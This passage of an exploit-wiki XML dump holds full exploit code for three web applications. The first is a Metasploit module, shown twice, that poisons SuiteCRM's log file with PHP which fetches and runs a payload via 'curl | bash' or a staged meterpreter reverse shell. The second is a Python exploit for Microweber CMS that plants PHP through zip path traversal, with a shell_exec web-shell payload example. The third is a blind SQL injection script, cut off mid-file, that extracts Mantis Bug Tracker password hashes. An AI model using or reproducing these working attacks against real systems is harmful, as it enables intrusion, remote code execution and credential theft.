          'Stability' =&gt; [CRASH_SAFE],
          'SideEffects' =&gt; [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' =&gt; [REPEATABLE_SESSION]
        },
        'Privileged' =&gt; true,
        'DisclosureDate' =&gt; '2021-04-28',
        'DefaultTarget' =&gt; 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to SuiteCRM', '/']),
        OptString.new('USER', [true, 'Username of user with administrative rights', 'admin']),
        OptString.new('PASS', [true, 'Password for administrator', 'admin']),
        OptBool.new('RESTORECONF', [false, 'Restore the configuration file to default after exploit runs', true]),
        OptString.new('WRITABLEDIR', [false, 'Writable directory to stage meterpreter', '/tmp']),
        OptString.new('LASTNAME', [false, 'Admin user last name to clean up profile', 'admin'])
      ]
    )
  end

  def check
    authenticate unless @authenticated
    return Exploit::CheckCode::Unknown unless @authenticated

    version_check_request = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri.path, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Home',
          'action' =&gt; 'About'
        }
      }
    )

    return Exploit::CheckCode::Unknown("#{peer} - Connection timed out") unless version_check_request

    version_match = version_check_request.body[/
      Version
      \s
      \d{1} # Major revision
      \.
      \d{1,2} # Minor revision
      \.
      \d{1,2} # Bug fix release
      /x]

    version = version_match.partition(' ').last

    if version.nil? || version.empty?
      about_url = "#{full_uri}#{normalize_uri(target_uri, 'index.php')}?module=Home&amp;action=About"
      return Exploit::CheckCode::Unknown("Check #{about_url} to confirm version.")
    end

    patched_version = Rex::Version.new('7.11.18')
    current_version = Rex::Version.new(version)

    return Exploit::CheckCode::Appears("SuiteCRM #{version}") if current_version &lt;= patched_version

    Exploit::CheckCode::Safe("SuiteCRM #{version}")
  end

  def authenticate
    print_status("Authenticating as #{datastore['USER']}")
    initial_req = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Users',
          'action' =&gt; 'Login'
        }
      }
    )

    return false unless initial_req &amp;&amp; initial_req.code == 200

    login = send_request_cgi(
      {
        'method' =&gt; 'POST',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_post' =&gt; {
          'module' =&gt; 'Users',
          'action' =&gt; 'Authenticate',
          'return_module' =&gt; 'Users',
          'return_action' =&gt; 'Login',
          'user_name' =&gt; datastore['USER'],
          'username_password' =&gt; datastore['PASS'],
          'Login' =&gt; 'Log In'
        }
      }
    )

    return false unless login &amp;&amp; login.code == 302

    res = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Administration',
          'action' =&gt; 'index'
        }
      }
    )

    auth_succeeded?(res)
  end

  def auth_succeeded?(res)
    return false unless res

    if res.code == 200
      print_good("Authenticated as: #{datastore['USER']}")
      if res.body.include?('Unauthorized access to administration.')
        print_warning("#{datastore['USER']} does not have administrative rights! Exploit will fail.")
        @is_admin = false
      else
        print_good("#{datastore['USER']} has administrative rights.")
        @is_admin = true
      end
      @authenticated = true
      return true
    else
      print_error("Failed to authenticate as: #{datastore['USER']}")
      return false
    end
  end

  def post_log_file(data)
    send_request_cgi(
      {
        'method' =&gt; 'POST',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'ctype' =&gt; "multipart/form-data; boundary=#{data.bound}",
        'keep_cookies' =&gt; true,
        'headers' =&gt; {
          'Referer' =&gt; "#{full_uri}#{normalize_uri(target_uri, 'index.php')}?module=Configurator&amp;action=EditView"
        },
        'data' =&gt; data.to_s
      }
    )
  end

  def modify_system_settings_file
    filename = rand_text_alphanumeric(8).to_s
    extension = '.pHp'
    @php_fname = filename + extension
    action = 'Modify system settings file'
    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('SaveConfig', nil, nil, 'form-data; name="action"')
    data.add_part('Configurator', nil, nil, 'form-data; name="module"')
    data.add_part(filename.to_s, nil, nil, 'form-data; name="logger_file_name"')
    data.add_part(extension.to_s, nil, nil, 'form-data; name="logger_file_ext"')
    data.add_part('info', nil, nil, 'form-data; name="logger_level"')
    data.add_part('Save', nil, nil, 'form-data; name="save"')

    res = post_log_file(data)
    check_logfile_request(res, action)
  end

  def poison_log_file
    action = 'Poison log file'
    if target.arch.first == 'cmd'
      command_injection = "&lt;?php `curl #{@download_url} | bash`; ?&gt;"
    else
      @meterpreter_fname = "#{datastore['WRITABLEDIR']}/#{rand_text_alphanumeric(8)}"
      command_injection = %(
        &lt;?php `curl #{@download_url} -o #{@meterpreter_fname};
        /bin/chmod 700 #{@meterpreter_fname};
        /bin/sh -c #{@meterpreter_fname};`; ?&gt;
      )
    end

    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('Users', nil, nil, 'form-data; name="module"')
    data.add_part('1', nil, nil, 'form-data; name="record"')
    data.add_part('Save', nil, nil, 'form-data; name="action"')
    data.add_part('EditView', nil, nil, 'form-data; name="page"')
    data.add_part('DetailView', nil, nil, 'form-data; name="return_action"')
    data.add_part(datastore['USER'], nil, nil, 'form-data; name="user_name"')
    data.add_part(command_injection, nil, nil, 'form-data; name="last_name"')

    res = post_log_file(data)
    check_logfile_request(res, action)
  end

  def restore
    action = 'Restore logging to default configuration'
    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('SaveConfig', nil, nil, 'form-data; name="action"')
    data.add_part('Configurator', nil, nil, 'form-data; name="module"')
    data.add_part('suitecrm', nil, nil, 'form-data; name="logger_file_name"')
    data.add_part('.log', nil, nil, 'form-data; name="logger_file_ext"')
    data.add_part('fatal', nil, nil, 'form-data; name="logger_level"')
    data.add_part('Save', nil, nil, 'form-data; name="save"')

    post_log_file(data)

    data = Rex::MIME::Message.new
    data.add_part('Users', nil, nil, 'form-data; name="module"')
    data.add_part('1', nil, nil, 'form-data; name="record"')
    data.add_part('Save', nil, nil, 'form-data; name="action"')
    data.add_part('EditView', nil, nil, 'form-data; name="page"')
    data.add_part('DetailView', nil, nil, 'form-data; name="return_action"')
    data.add_part(datastore['USER'], nil, nil, 'form-data; name="user_name"')
    data.add_part(datastore['LASTNAME'], nil, nil, 'form-data; name="last_name"')

    res = post_log_file(data)

    print_error("Failed - #{action}") unless res &amp;&amp; res.code == 301

    print_good("Succeeded - #{action}")
  end

  def check_logfile_request(res, action)
    fail_with(Failure::Unknown, "#{action} - no reply") unless res

    unless res.code == 301
      print_error("Failed - #{action}")
      fail_with(Failure::UnexpectedReply, "Failed - #{action}")
    end

    print_good("Succeeded - #{action}")
  end

  def execute_php
    print_status("Executing php code in log file: #{@php_fname}")
    res = send_request_cgi(
      {
        'uri' =&gt; normalize_uri(target_uri, @php_fname),
        'keep_cookies' =&gt; true
      }
    )
    fail_with(Failure::NotFound, "#{peer} - Not found: #{@php_fname}") if res &amp;&amp; res.code == 404
    register_files_for_cleanup(@php_fname)
    register_files_for_cleanup(@meterpreter_fname) unless @meterpreter_fname.nil? || @meterpreter_fname.empty?
  end

  def on_request_uri(cli, _request)
    send_response(cli, payload.encoded, { 'Content-Type' =&gt; 'text/plain' })
    print_good("#{peer} - Payload sent!")
  end

  def start_http_server
    start_service(
      {
        'Uri' =&gt; {
          'Proc' =&gt; proc do |cli, req|
            on_request_uri(cli, req)
          end,
          'Path' =&gt; resource_uri
        }
      }
    )
    @download_url = get_uri
  end

  def exploit
    start_http_server
    authenticate unless @authenticated
    fail_with(Failure::NoAccess, datastore['USER'].to_s) unless @authenticated
    fail_with(Failure::NoAccess, "#{datastore['USER']} does not have administrative rights!") unless @is_admin
    modify_system_settings_file
    poison_log_file
    execute_php
  ensure
    restore if datastore['RESTORECONF']
  end
end
&lt;/pre&gt;</text>
      <sha1>9lwgq88gva00wdahq1nxoce5366i674</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28328 SuiteCRM Log File 遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5091</id>
    <revision>
      <id>5831</id>
      <timestamp>2021-06-24T02:30:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-28328 SuiteCRM Log File 远程代码执行漏洞"</comment>
      <origin>5831</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11588" sha1="10doikh6gcyljjh7uw6lpjfagl62nsh" xml:space="preserve">&lt;languages  /&gt;
==MSF模块==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'SuiteCRM Log File Remote Code Execution',
        'Description' =&gt; %q{
          This module exploits an input validation error on the log file extension parameter. It does
          not properly validate upper/lower case characters. Once this occurs, the application log file
          will be treated as a php file. The log file can then be populated with php code by changing the
          username of a valid user, as this info is logged. The php code in the file can then be executed
          by sending an HTTP request to the log file. A similar issue was reported by the same researcher
          where a blank file extension could be supplied and the extension could be provided in the file
          name. This exploit will work on those versions as well, and those references are included.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'M. Cory Billington' # @_th3y
          ],
        'References' =&gt;
          [
            ['CVE', '2020-28328'], # First CVE
            ['EDB', '49001'], # Previous exploit, this module will cover those versions too. Almost identical issue.
            ['URL', 'https://theyhack.me/CVE-2020-28320-SuiteCRM-RCE/'], # First exploit
            ['URL', 'https://theyhack.me/SuiteCRM-RCE-2/'] # This exploit
          ],
        'Platform' =&gt; %w[linux unix],
        'Arch' =&gt; %w[ARCH_X64 ARCH_CMD ARCH_X86],
        'Targets' =&gt;
        [
          [
            'Linux (x64)', {
              'Arch' =&gt; ARCH_X64,
              'Platform' =&gt; 'linux',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'Linux (cmd)', {
              'Arch' =&gt; ARCH_CMD,
              'Platform' =&gt; 'unix',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'Notes' =&gt;
        {
          'Stability' =&gt; [CRASH_SAFE],
          'SideEffects' =&gt; [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' =&gt; [REPEATABLE_SESSION]
        },
        'Privileged' =&gt; true,
        'DisclosureDate' =&gt; '2021-04-28',
        'DefaultTarget' =&gt; 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to SuiteCRM', '/']),
        OptString.new('USER', [true, 'Username of user with administrative rights', 'admin']),
        OptString.new('PASS', [true, 'Password for administrator', 'admin']),
        OptBool.new('RESTORECONF', [false, 'Restore the configuration file to default after exploit runs', true]),
        OptString.new('WRITABLEDIR', [false, 'Writable directory to stage meterpreter', '/tmp']),
        OptString.new('LASTNAME', [false, 'Admin user last name to clean up profile', 'admin'])
      ]
    )
  end

  def check
    authenticate unless @authenticated
    return Exploit::CheckCode::Unknown unless @authenticated

    version_check_request = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri.path, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Home',
          'action' =&gt; 'About'
        }
      }
    )

    return Exploit::CheckCode::Unknown("#{peer} - Connection timed out") unless version_check_request

    version_match = version_check_request.body[/
      Version
      \s
      \d{1} # Major revision
      \.
      \d{1,2} # Minor revision
      \.
      \d{1,2} # Bug fix release
      /x]

    version = version_match.partition(' ').last

    if version.nil? || version.empty?
      about_url = "#{full_uri}#{normalize_uri(target_uri, 'index.php')}?module=Home&amp;action=About"
      return Exploit::CheckCode::Unknown("Check #{about_url} to confirm version.")
    end

    patched_version = Rex::Version.new('7.11.18')
    current_version = Rex::Version.new(version)

    return Exploit::CheckCode::Appears("SuiteCRM #{version}") if current_version &lt;= patched_version

    Exploit::CheckCode::Safe("SuiteCRM #{version}")
  end

  def authenticate
    print_status("Authenticating as #{datastore['USER']}")
    initial_req = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Users',
          'action' =&gt; 'Login'
        }
      }
    )

    return false unless initial_req &amp;&amp; initial_req.code == 200

    login = send_request_cgi(
      {
        'method' =&gt; 'POST',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_post' =&gt; {
          'module' =&gt; 'Users',
          'action' =&gt; 'Authenticate',
          'return_module' =&gt; 'Users',
          'return_action' =&gt; 'Login',
          'user_name' =&gt; datastore['USER'],
          'username_password' =&gt; datastore['PASS'],
          'Login' =&gt; 'Log In'
        }
      }
    )

    return false unless login &amp;&amp; login.code == 302

    res = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Administration',
          'action' =&gt; 'index'
        }
      }
    )

    auth_succeeded?(res)
  end

  def auth_succeeded?(res)
    return false unless res

    if res.code == 200
      print_good("Authenticated as: #{datastore['USER']}")
      if res.body.include?('Unauthorized access to administration.')
        print_warning("#{datastore['USER']} does not have administrative rights! Exploit will fail.")
        @is_admin = false
      else
        print_good("#{datastore['USER']} has administrative rights.")
        @is_admin = true
      end
      @authenticated = true
      return true
    else
      print_error("Failed to authenticate as: #{datastore['USER']}")
      return false
    end
  end

  def post_log_file(data)
    send_request_cgi(
      {
        'method' =&gt; 'POST',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'ctype' =&gt; "multipart/form-data; boundary=#{data.bound}",
        'keep_cookies' =&gt; true,
        'headers' =&gt; {
          'Referer' =&gt; "#{full_uri}#{normalize_uri(target_uri, 'index.php')}?module=Configurator&amp;action=EditView"
        },
        'data' =&gt; data.to_s
      }
    )
  end

  def modify_system_settings_file
    filename = rand_text_alphanumeric(8).to_s
    extension = '.pHp'
    @php_fname = filename + extension
    action = 'Modify system settings file'
    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('SaveConfig', nil, nil, 'form-data; name="action"')
    data.add_part('Configurator', nil, nil, 'form-data; name="module"')
    data.add_part(filename.to_s, nil, nil, 'form-data; name="logger_file_name"')
    data.add_part(extension.to_s, nil, nil, 'form-data; name="logger_file_ext"')
    data.add_part('info', nil, nil, 'form-data; name="logger_level"')
    data.add_part('Save', nil, nil, 'form-data; name="save"')

    res = post_log_file(data)
    check_logfile_request(res, action)
  end

  def poison_log_file
    action = 'Poison log file'
    if target.arch.first == 'cmd'
      command_injection = "&lt;?php `curl #{@download_url} | bash`; ?&gt;"
    else
      @meterpreter_fname = "#{datastore['WRITABLEDIR']}/#{rand_text_alphanumeric(8)}"
      command_injection = %(
        &lt;?php `curl #{@download_url} -o #{@meterpreter_fname};
        /bin/chmod 700 #{@meterpreter_fname};
        /bin/sh -c #{@meterpreter_fname};`; ?&gt;
      )
    end

    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('Users', nil, nil, 'form-data; name="module"')
    data.add_part('1', nil, nil, 'form-data; name="record"')
    data.add_part('Save', nil, nil, 'form-data; name="action"')
    data.add_part('EditView', nil, nil, 'form-data; name="page"')
    data.add_part('DetailView', nil, nil, 'form-data; name="return_action"')
    data.add_part(datastore['USER'], nil, nil, 'form-data; name="user_name"')
    data.add_part(command_injection, nil, nil, 'form-data; name="last_name"')

    res = post_log_file(data)
    check_logfile_request(res, action)
  end

  def restore
    action = 'Restore logging to default configuration'
    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('SaveConfig', nil, nil, 'form-data; name="action"')
    data.add_part('Configurator', nil, nil, 'form-data; name="module"')
    data.add_part('suitecrm', nil, nil, 'form-data; name="logger_file_name"')
    data.add_part('.log', nil, nil, 'form-data; name="logger_file_ext"')
    data.add_part('fatal', nil, nil, 'form-data; name="logger_level"')
    data.add_part('Save', nil, nil, 'form-data; name="save"')

    post_log_file(data)

    data = Rex::MIME::Message.new
    data.add_part('Users', nil, nil, 'form-data; name="module"')
    data.add_part('1', nil, nil, 'form-data; name="record"')
    data.add_part('Save', nil, nil, 'form-data; name="action"')
    data.add_part('EditView', nil, nil, 'form-data; name="page"')
    data.add_part('DetailView', nil, nil, 'form-data; name="return_action"')
    data.add_part(datastore['USER'], nil, nil, 'form-data; name="user_name"')
    data.add_part(datastore['LASTNAME'], nil, nil, 'form-data; name="last_name"')

    res = post_log_file(data)

    print_error("Failed - #{action}") unless res &amp;&amp; res.code == 301

    print_good("Succeeded - #{action}")
  end

  def check_logfile_request(res, action)
    fail_with(Failure::Unknown, "#{action} - no reply") unless res

    unless res.code == 301
      print_error("Failed - #{action}")
      fail_with(Failure::UnexpectedReply, "Failed - #{action}")
    end

    print_good("Succeeded - #{action}")
  end

  def execute_php
    print_status("Executing php code in log file: #{@php_fname}")
    res = send_request_cgi(
      {
        'uri' =&gt; normalize_uri(target_uri, @php_fname),
        'keep_cookies' =&gt; true
      }
    )
    fail_with(Failure::NotFound, "#{peer} - Not found: #{@php_fname}") if res &amp;&amp; res.code == 404
    register_files_for_cleanup(@php_fname)
    register_files_for_cleanup(@meterpreter_fname) unless @meterpreter_fname.nil? || @meterpreter_fname.empty?
  end

  def on_request_uri(cli, _request)
    send_response(cli, payload.encoded, { 'Content-Type' =&gt; 'text/plain' })
    print_good("#{peer} - Payload sent!")
  end

  def start_http_server
    start_service(
      {
        'Uri' =&gt; {
          'Proc' =&gt; proc do |cli, req|
            on_request_uri(cli, req)
          end,
          'Path' =&gt; resource_uri
        }
      }
    )
    @download_url = get_uri
  end

  def exploit
    start_http_server
    authenticate unless @authenticated
    fail_with(Failure::NoAccess, datastore['USER'].to_s) unless @authenticated
    fail_with(Failure::NoAccess, "#{datastore['USER']} does not have administrative rights!") unless @is_admin
    modify_system_settings_file
    poison_log_file
    execute_php
  ensure
    restore if datastore['RESTORECONF']
  end
end
&lt;/pre&gt;</text>
      <sha1>10doikh6gcyljjh7uw6lpjfagl62nsh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28337 Microweber CMS 1.1.20 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>2325</id>
    <revision>
      <id>2761</id>
      <timestamp>2021-05-11T03:46:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Microweber CMS 1.1.20 - Remote Code Execution (Authenticated)  # Date: 2020-10-31 # Exploit Author: sl1nki # Vendor Homepage: https://microweber..."</comment>
      <origin>2761</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8125" sha1="gc495td3o4dmfd5hx8rv5v5v6rhh5ef" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Microweber CMS 1.1.20 - Remote Code Execution (Authenticated) 
# Date: 2020-10-31
# Exploit Author: sl1nki
# Vendor Homepage: https://microweber.org/
# Software Link: https://github.com/microweber/microweber/tree/1.1.20
# Version: &lt;=1.1.20
# Tested on: Ubuntu 18.04
# CVE : CVE-2020-28337
#
# Example usage with default phpinfo() payload:
#     ./microweber_rce.py \
#         --hostname "http://microwebertest.com" \
#         --username "admin" \
#         --password "password123"
#
#
# Example usage with custom payload (shell_exec):
#     ./microweber_rce.py \
#         --hostname "http://microwebertest.com" \
#         --username "admin" \
#         --password "password123" \
#         --payload '&lt;?php if (isset($_REQUEST["fexec"])) {echo "&lt;pre&gt;" . shell_exec($_REQUEST["fexec"]) . "&lt;/pre&gt;";} ?&gt;'
#
# Notes:
#   * SSL verification is disabled by default
#   * If for some reason the --target-path "/userfiles/cache

#!/usr/bin/python3

#/" doesn't work, "/userfiles/modules/" is a good one too.
#
#
#


import argparse
import re
import requests
import sys
import zipfile

from io import BytesIO

# Disable insecure SSL warnings
requests.packages.urllib3.disable_warnings()

class Microweber():
    def __init__(self, baseUrl, proxies=None):
        self.baseUrl = baseUrl
        self.proxies = proxies
        self.cookies = None

        self.loginUrl = "/api/user_login"
        self.uploadUrl = "/plupload"
        self.moveZipToBackupUrl = "/api/Microweber/Utils/Backup/move_uploaded_file_to_backup"
        self.restoreBackupUrl = "/api/Microweber/Utils/Backup/restore"

        self.targetPath = "/userfiles/cache/"
        self.targetFilename = "payload.php"
        self.zipPayloadName = "payload.zip"

    def makePostRequest(self, url, data=None, files=None, headers=None):
        return requests.post(self.baseUrl + url,
            data=data,
            files=files,
            headers=headers,
            cookies=self.cookies,
            proxies=self.proxies,
            verify=False
        )

    def makeGetRequest(self, url, params=None):
        return requests.post(self.baseUrl + url,
            params=params,
            cookies=self.cookies,
            proxies=self.proxies,
            verify=False
        )

    def login(self, username, password):
        res = self.makePostRequest(self.loginUrl, data={
            "username": username,
            "password": password
        })

        if res.status_code == 200 and 'success' in res.json() and res.json()['success'] == "You are logged in!":
            print(f"[+] Successfully logged in as {username}")
            self.cookies = res.cookies
        else:
            print(f"[-] Unable to login.  Status Code: {res.status_code}")
            sys.exit(-1)

    def createZip(self, path=None, filename=None, payload=None):
        # In-memory adaptation of ptoomey3's evilarc

    # https://github.com/ptoomey3/evilarc

        if payload == None:
            payload = "&lt;?php phpinfo(); ?&gt;"

        zd = BytesIO()
        zf = zipfile.ZipFile(zd, "w")

        # The custom Unzip class uses a path under the webroot for cached file extraction
        # /storage/cache/backup_restore/&lt;md5 hash&gt;/
        # so moving up 4 directories puts us at the webroot
        zf.writestr(f"../../../..{path}{filename}", payload)
        zf.close()
        return zd

    def uploadZip(self, zipData):
        # Upload the zip data as a general file

        res = self.makePostRequest(self.uploadUrl,
            headers={"Referer": ""},
            data={
                "name": self.zipPayloadName,
                "chunk": 0,
                "chunks": 1
            },
            files={"file": (self.zipPayloadName, zipData.getvalue(), "application/zip")}
        )

        if res.status_code == 200:
            print(f"[+] Successfully uploaded: {self.zipPayloadName}")
            j = res.json()
            print(f"[+]     URL: {j['src']}")
            print(f"[+]     Resulting Filename: {j['name']}")
            self.zipPayloadName = j['name']
        else:
            print(f"[-] Unable to upload: {self.zipPayloadName} (Status Code: {res.status_code})")
            sys.exit(-1)

    def getAbsoluteWebRoot(self):
        # Determine the webroot using the debug output and the DefaultController.php path
        res = self.makeGetRequest("", params={
            "debug": "true"
        })

        if res.status_code != 200:
            print(f"[-] Unable to collect debug information.  Bad server response: {res.status_code}")
            sys.exit(-1)

        target = "src/Microweber/Controllers/DefaultController.php"
        m = re.findall('([\/\w]+)\/src\/Microweber\/Controllers\/DefaultController\.php', res.text)
        if len(m) == 1:
            return m[0]
        else:
            print(f"[-] Unable to determine the webroot using {target}.  Found {len(m)} matches")

    def moveZipToBackup(self):
        # Move the uploaded zip file into the backup directory

        webRoot = self.getAbsoluteWebRoot()
        hostname = self.baseUrl.split("//")[1]

        src = f"{webRoot}/userfiles/media/{hostname}/{self.zipPayloadName}"
        res = self.makeGetRequest(self.moveZipToBackupUrl, params={
            "src": src
        })

        if res.status_code == 200 and 'success' in res.json() and res.json()['success'] == f"{self.zipPayloadName} was uploaded!":
            print(f"[+] Successfully moved {self.zipPayloadName} to backup")
        else:
            print(f"[-] Unable to move zip to backup ({res.status_code})")
            sys.exit(-1)

    def restoreBackup(self, filename):
        # With the zip file in the backup directory, 'restore' it, which will cause it to be extracted unsafely

        res = self.makePostRequest(self.restoreBackupUrl, data={

       "id": filename
        })

        if res.status_code == 200 and "Backup was restored!" in res.text:
            print(f"[+] Successfully restored backup {filename}")
        else:
            print(f"[-] Unable to restore backup {filename}")
            sys.exit(-1)

    def exploit(self, payload=None):
        zipData = m.createZip(self.targetPath, self.targetFilename, payload=payload)
        m.uploadZip(zipData)
        m.moveZipToBackup()
        m.restoreBackup(self.zipPayloadName)

        print(f"[+] Successfully uploaded payload to {self.targetFilename}!=")
        print(f"[+]     Visit: {self.baseUrl}{self.targetPath}{self.targetFilename}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--hostname", required=True, dest="hostname", help="Microweber hostname with protocol (e.g. http://microwebertest.com)")
    parser.add_argument("--http-proxy", required=False, dest="http_proxy", help="HTTP Proxy (e.g. http://127.0.0.1:8000)")
    parser.add_argument("--username", "-u", required=True, dest="username", help="Username of administrative user")
    parser.add_argument("--password", "-p", required=True, dest="password", help="Password of administrative user")
    parser.add_argument("--payload", required=False, dest="payload", help="Payload contents.  Should be a string of PHP code.  (default is phpinfo() )")

    # Uncommon args
    parser.add_argument("--target-file", required=False, dest="target_file", help="Target filename of the payload (default: payload.php")
    parser.add_argument("--target-path", required=False, dest="target_path", help="Target path relative to webroot for the payload (default: /userfiles/cache/")
    parser.add_argument("--zip-name", required=False, dest="zip_name", help="File name of tmp backup zip")
    args = parser.parse_args()

    proxies = None
    if args.http_proxy:
        proxies = {
            "http": args.http_proxy
        }

    m = Microweber(args.hostname, proxies=proxies)

    if args.target_file:
        m.targetFilename = args.target_file
    if args.target_path:
        m.targetPath = args.target_path

    if args.zip_name:
        m.zipPayloadName = args.zip_name

    m.login(args.username, args.password)
    m.exploit(args.payload)
            
&lt;/pre&gt;</text>
      <sha1>gc495td3o4dmfd5hx8rv5v5v6rhh5ef</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28413 Mantis Bug Tracker 2.24.3 SQL注入漏洞</title>
    <ns>0</ns>
    <id>1030</id>
    <revision>
      <id>1305</id>
      <timestamp>2021-04-09T08:49:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Mantis Bug Tracker 2.24.3 - 'access' SQL Injection # Date: 30/12/2020 # Exploit Author: EthicalHCOP # Vendor Homepage: https://www.mantisbt.org/..."</comment>
      <origin>1305</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3584" sha1="sqf0bnvuz71hww9qgp3uig9vptaajrl" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Mantis Bug Tracker 2.24.3 - 'access' SQL Injection
# Date: 30/12/2020
# Exploit Author: EthicalHCOP
# Vendor Homepage: https://www.mantisbt.org/
# Version: 2.24.3
# CVE: CVE-2020-28413

import requests, sys, time
from lxml import etree

proxies = {
     "http": "http://127.0.0.1:8080",
     "https": "http://127.0.0.1:8080",
    }

def Hacer_Peticion(query):
    home = ""
    url = home+"/api/soap/mantisconnect.php"
    headers = {'content-type': 'text/xml',
               'SOAPAction': url+'"/mc_project_get_users"'}
    mantis_db_user = ""
    mantis_db_pass = ""
    body = """&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:man="http://futureware.biz/mantisconnect"&gt;
       &lt;soapenv:Header/&gt;
       &lt;soapenv:Body&gt;
          &lt;man:mc_project_get_users soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
             &lt;username xsi:type="xsd:string"&gt;"""+mantis_db_user+"""&lt;/username&gt;
             &lt;password xsi:type="xsd:string"&gt;"""+mantis_db_pass+"""&lt;/password&gt;
             &lt;project_id xsi:type="xsd:integer"&gt;0&lt;/project_id&gt;
             &lt;access xsi:type="xsd:string"&gt;"""+query+"""&lt;/access&gt;
          &lt;/man:mc_project_get_users&gt;
       &lt;/soapenv:Body&gt;
    &lt;/soapenv:Envelope&gt;"""
    response = requests.post(url, data=body, headers=headers, verify=False)
    #response = requests.post(url, data=body, headers=headers, proxies=proxies, verify=False)
    parser = etree.XMLParser(remove_blank_text=True)
    xml = etree.XML(response.content, parser)
    xml = etree.tostring(xml)
    return(str(xml))

def Cantidad_Usuarios_Mantis():
    query = "0 union all select concat('-',(select count(*) " \
            "from mantis_user_table),'0'),2,3,4 order by id asc limit 1"
    xml = Hacer_Peticion(query)
    txt = xml.split("integer")
    txt = txt[1].split("id")
    registros = str(str(str(txt[0])[:-2])[-2:])[:-1]
    return(registros)

def Obtener_Id(usr_pos):
    query = "0 union all select concat((SELECT id FROM mantis_user_table " \
            "order by id asc limit 0,1),'0'),2,3,4 limit "+str(usr_pos)+",1"
    xml = Hacer_Peticion(query)
    txt = xml.split("integer")
    txt = txt[1].split("id")
    id = str(str(txt[0])[:-2])[-1:]
    name = str(str(txt[1])[29:]).split("&lt;/name&gt;")[0]
    return (id+"-"+name)

def brute_force(data):
    charts = "abcdefghijklmnopqrstuvwxyz0123456789"
    passw = ""
    id = data.split("-")[0]
    name = data.split("-")[1]
    for cp in range (1,33,1):
        for c in charts:
            print(f"\rHash: {passw}", end="")
            time.sleep(0.00001)
            sys.stdout.flush()
            query = "0 union all select (select if(substring((select binary(password) " \
                    "from mantis_user_table where id = " + str(id) + ")," + str(cp) + ",1)='" + str(c) + "','0','900000000000000000000')), 2,3,4 order by id asc limit 1"
            xml = Hacer_Peticion(query)
            txt = xml.split("integer")
            txt = txt[1].split("id")
            r_id = str(str(txt[0])[:-2])[-1:]
            if(r_id=="0"):
                passw = passw + str(c)
                break
    print(f"\r", end="")
    sys.stdout.flush()
    print(name+": "+passw)

def main():
